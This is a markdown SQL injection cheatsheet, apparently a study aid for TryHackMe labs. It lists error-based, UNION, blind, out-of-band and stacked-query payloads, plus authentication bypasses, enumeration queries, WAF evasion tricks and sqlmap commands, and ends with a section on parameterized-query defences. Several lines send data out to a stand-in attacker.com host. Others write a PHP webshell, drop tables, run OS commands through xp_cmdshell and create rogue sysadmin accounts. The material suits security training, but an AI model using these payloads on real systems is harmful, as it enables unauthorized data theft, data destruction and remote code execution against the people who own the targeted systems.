# SQL Injection — Complete Cheatsheet
> OWASP Top 10 2025: A05 – Injection

---

## 1. What is SQL Injection?

SQL Injection (SQLi) occurs when **user-supplied input is inserted into a SQL query without proper sanitization**, allowing an attacker to manipulate the query logic — reading unauthorized data, bypassing authentication, or executing OS commands.

```sql
-- Normal query
SELECT * FROM users WHERE username = 'alice' AND password = 'secret';

-- After injection (input: ' OR '1'='1)
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';
-- Returns ALL rows — authentication bypassed
```

---

## 2. Types of SQL Injection

### 2.1 In-Band SQLi (response visible directly)

#### a) Error-Based SQLi
- Forces the database to throw **errors that reveal schema/data**
- Impact: Database version, table names, column names extracted from error messages

```sql
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) --
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --
```

#### b) UNION-Based SQLi
- Appends a **UNION SELECT** to original query to fetch data from other tables
- Requires: same number of columns, compatible data types

```sql
' ORDER BY 3--          -- find number of columns
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT username,password,NULL FROM users--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
```

---

### 2.2 Blind SQLi (no visible output)

#### a) Boolean-Based Blind SQLi
- Sends queries that return **true/false** conditions — infers data from app behavior

```sql
' AND 1=1--   → page loads normally (TRUE)
' AND 1=2--   → page changes/breaks (FALSE)

-- Extract data character by character
' AND SUBSTRING(username,1,1)='a'--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>97--
```

#### b) Time-Based Blind SQLi
- No visible difference in response — uses **deliberate delays** to infer true/false

```sql
-- MySQL
' AND SLEEP(5)--              → delays 5 sec = vulnerable
' AND IF(1=1, SLEEP(5), 0)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT pg_sleep(5)--

-- Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
```

---

### 2.3 Out-of-Band SQLi (OOB)
- Exfiltrates data via **DNS or HTTP requests** to attacker-controlled server
- Used when in-band channels are blocked

```sql
-- MySQL (requires FILE privilege)
' AND LOAD_FILE('\\\\attacker.com\\share')--

-- MSSQL
'; EXEC master..xp_dirtree '\\attacker.com\share'--

-- Oracle
' AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))--
```

---

### 2.4 Second-Order SQLi (Stored SQLi)
- Malicious payload is **stored** in the database and executed later when retrieved
- Input appears safe at entry but triggers when used in a future query

```
Registration: username = admin'--
Later: UPDATE users SET password='x' WHERE username='admin'--'
→ Updates admin's password instead of attacker's
```

---

### 2.5 Stacked Queries (Batched SQLi)
- Terminates original query and **runs additional queries**
- Supported by: MSSQL, PostgreSQL (not MySQL via mysqli by default)

```sql
'; DROP TABLE users;--
'; INSERT INTO users VALUES ('hacker','hacked');--
'; EXEC xp_cmdshell('whoami');--
```

---

## 3. Authentication Bypass Techniques

```sql
-- Classic bypass
' OR '1'='1
' OR '1'='1'--
' OR 1=1--
admin'--
admin' #

-- Username field only
' OR 1=1 LIMIT 1--
') OR ('1'='1

-- With known username
admin'--
admin' #
admin'/*

-- Comment variations
--          (MySQL, MSSQL, SQLite)
#           (MySQL)
/*          (block comment)
;%00        (null byte)
```

---

## 4. Database Fingerprinting

```sql
-- Version detection
@@version          (MySQL, MSSQL)
version()          (PostgreSQL)
SELECT banner FROM v$version  (Oracle)

-- Database name
database()         (MySQL)
DB_NAME()          (MSSQL)
current_database() (PostgreSQL)

-- Current user
user()             (MySQL)
SYSTEM_USER()      (MSSQL)
current_user       (PostgreSQL)
```

---

## 5. Enumeration Queries

### MySQL
```sql
-- All databases
SELECT schema_name FROM information_schema.schemata;

-- All tables
SELECT table_name FROM information_schema.tables WHERE table_schema=database();

-- All columns
SELECT column_name FROM information_schema.columns WHERE table_name='users';

-- Dump data
SELECT username,password FROM users;
```

### MSSQL
```sql
SELECT name FROM sys.databases;
SELECT name FROM sys.tables;
SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('users');
SELECT loginname FROM syslogins WHERE sysadmin=1;
```

### PostgreSQL
```sql
SELECT datname FROM pg_database;
SELECT tablename FROM pg_tables WHERE schemaname='public';
SELECT column_name FROM information_schema.columns WHERE table_name='users';
```

### Oracle
```sql
SELECT owner,table_name FROM all_tables;
SELECT column_name FROM all_tab_columns WHERE table_name='USERS';
SELECT username,password FROM dba_users;
```

---

## 6. Reading & Writing Files

### MySQL
```sql
-- Read file (requires FILE privilege)
SELECT LOAD_FILE('/etc/passwd');
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--

-- Write file (into web root for webshell)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

### MSSQL — OS Command Execution
```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute command
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user hacker P@ssw0rd /add';
```

---

## 7. WAF & Filter Bypass Techniques

### Case Variation
```sql
sElEcT * FrOm users
UNION SELECT → UnIoN SeLeCt
```

### Comment Injection
```sql
UN/**/ION SEL/**/ECT
UN--\nION SELECT
```

### URL Encoding
```sql
%27 = '
%20 = space
%55NION = UNION
```

### Double URL Encoding
```sql
%2527 = ' (decoded twice)
```

### Whitespace Bypass
```sql
UNION%09SELECT    (tab)
UNION%0ASELECT    (newline)
UNION%0DSELECT    (carriage return)
SELECT(username)FROM(users)
```

### Keyword Bypass
```sql
-- When SELECT is filtered
UNION ALL SELECT
UNION DISTINCT SELECT

-- When space is filtered
'/**/OR/**/'1'='1
UNION(SELECT(username),(password)FROM(users))

-- When quotes are filtered
WHERE username=0x61646d696e     (hex encoding: 'admin')
WHERE username=CHAR(97,100,109,105,110)
```

### HPP (HTTP Parameter Pollution)
```
?id=1&id=2 UNION SELECT...
```

### Scientific Notation
```sql
1e0UNION1e0SELECT...
```

---

## 8. Privilege Escalation via SQLi

```sql
-- Check current privileges (MySQL)
SELECT grantee,privilege_type FROM information_schema.user_privileges;

-- Check if superuser (PostgreSQL)
SELECT usesuper FROM pg_user WHERE usename=current_user;

-- MSSQL — is sysadmin?
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Add new admin user (MSSQL)
EXEC sp_addlogin 'hacker','P@ss123';
EXEC sp_addsrvrolemember 'hacker','sysadmin';
```

---

## 9. Impacts by Type

| Type | Impact | Severity |
|---|---|---|
| Error-Based | DB version, schema, data leak via errors | High |
| UNION-Based | Full data extraction from any table | Critical |
| Boolean Blind | Slow but complete data extraction | High |
| Time-Based Blind | Data extraction, DoS via sleep | High |
| Stacked Queries | RCE, data modification, user creation | Critical |
| Out-of-Band | Data exfil bypassing all filters | Critical |
| Second-Order | Privilege escalation, account takeover | Critical |
| Auth Bypass | Full authentication bypass | Critical |
| File Read/Write | LFI, webshell upload, RCE | Critical |

---

## 10. Automated Tools

### sqlmap — the standard
```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1"

# POST request
sqlmap -u "http://target.com/login" --data="user=a&pass=b"

# With cookies (authenticated)
sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123"

# Dump specific DB
sqlmap -u "http://target.com/page?id=1" -D dbname --dump

# OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell

# WAF bypass
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between,randomcase

# Level/risk (max aggression)
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3

# From Burp request file
sqlmap -r request.txt -p id
```

### Common tamper scripts
```
space2comment    → replaces space with /**/
between          → replaces > with BETWEEN
randomcase       → randomizes case
charencode       → URL encodes characters
base64encode     → base64 encodes payload
equaltolike      → replaces = with LIKE
```

---

## 11. Defence & Mitigations

### Primary Defence — Parameterized Queries / Prepared Statements

```python
# VULNERABLE
query = "SELECT * FROM users WHERE id = " + user_input

# SECURE — Python (parameterized)
cursor.execute("SELECT * FROM users WHERE id = %s", (user_input,))
```

```java
// SECURE — Java (PreparedStatement)
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE username = ?");
stmt.setString(1, username);
```

```php
// SECURE — PHP (PDO)
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->execute(['id' => $id]);
```

### Secondary Defences

| Defence | Description |
|---|---|
| **Input Validation** | Whitelist expected input types (integer, email, etc.) |
| **Stored Procedures** | Use pre-compiled DB procedures (if written securely) |
| **Least Privilege** | DB user should only have SELECT — not DROP, FILE, EXECUTE |
| **WAF** | Web Application Firewall to detect/block known payloads |
| **Error Handling** | Never expose DB error messages to end users |
| **Escaping** | Last resort — escape special chars if parameterization unavailable |
| **ORM** | Use ORM frameworks (Hibernate, SQLAlchemy) — safer by default |
| **Input Length Limits** | Limit field lengths to reduce injection surface |

---

## 12. Quick Reference — Special Characters

| Character | Purpose in SQLi |
|---|---|
| `'` | String terminator |
| `"` | String terminator (some DBs) |
| `--` | Single-line comment (MySQL, MSSQL) |
| `#` | Single-line comment (MySQL) |
| `/* */` | Block comment |
| `;` | Statement terminator (stacked queries) |
| `%` | Wildcard in LIKE |
| `_` | Single-char wildcard in LIKE |
| `\` | Escape character |

---

## 13. THM Lab Reference

```
Target IP   : (set per lab)
Add to hosts: echo "IP hrms.thm" >> /etc/hosts

Entry points to test:
  - Login forms     → auth bypass
  - Search fields   → UNION / error-based
  - URL parameters  → ?id=1'
  - Cookies         → id=1' (check with Burp)
  - HTTP headers    → X-Forwarded-For, User-Agent

Test order:
  1. Single quote  '
  2. Double quote  "
  3. Comment       '-- or '#
  4. Boolean       ' OR 1=1--
  5. UNION cols    ' ORDER BY N--
  6. Time-based    ' AND SLEEP(5)--
```

---

*Reference: OWASP Top 10 2025 A05 – Injection | PortSwigger SQLi Labs | HackTricks SQLi*
